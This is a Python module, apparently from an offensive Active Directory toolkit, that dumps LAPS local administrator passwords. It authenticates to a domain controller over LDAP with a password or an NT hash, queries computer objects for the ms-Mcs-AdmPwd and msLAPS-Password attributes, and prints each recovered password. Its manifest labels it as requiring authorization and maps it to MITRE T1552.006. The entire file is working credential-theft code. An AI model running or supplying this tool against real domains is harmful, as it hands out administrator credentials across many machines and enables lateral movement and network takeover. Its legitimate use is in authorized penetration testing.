"""LAPS password dump — extract ms-Mcs-AdmPwd from computer objects."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.enum.laps_dump.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_query"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.006"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    target_computer = getattr(args, "target_computer", None)

    print("[*] LAPS password dump → {}".format(dc_ip))
    try:
        from impacket.ldap import ldap as imp_ldap
        base_dn = "DC=" + ",DC=".join(args.domain.split("."))
        conn = imp_ldap.LDAPConnection("ldap://{}".format(dc_ip), base_dn)
        if cred.has_hash:
            conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
        else:
            conn.login(cred.username, cred.password or "", cred.domain)

        filt = "(&(objectClass=computer)(sAMAccountName={}))".format(target_computer) if target_computer else "(objectClass=computer)"
        entries = conn.search(searchBase=base_dn, searchFilter=filt,
            attributes=["sAMAccountName", "ms-Mcs-AdmPwd", "msLAPS-Password",
                        "msLAPS-EncryptedPassword"])

        found = 0
        for entry in entries:
            if hasattr(entry, "getComponentByName"):
                attrs = entry["attributes"]
                sam = str(attrs.get("sAMAccountName", ""))
                for attr in ("ms-Mcs-AdmPwd", "msLAPS-Password"):
                    val = attrs.get(attr)
                    if val:
                        print("[+] {} ({}): {}".format(sam, attr, val))
                        found += 1

        print("[*] {} LAPS passwords retrieved".format(found))
        return 0 if found > 0 else 1
    except Exception as exc:
        print("[-] LAPS dump error: {}".format(exc), file=sys.stderr)
        return 1
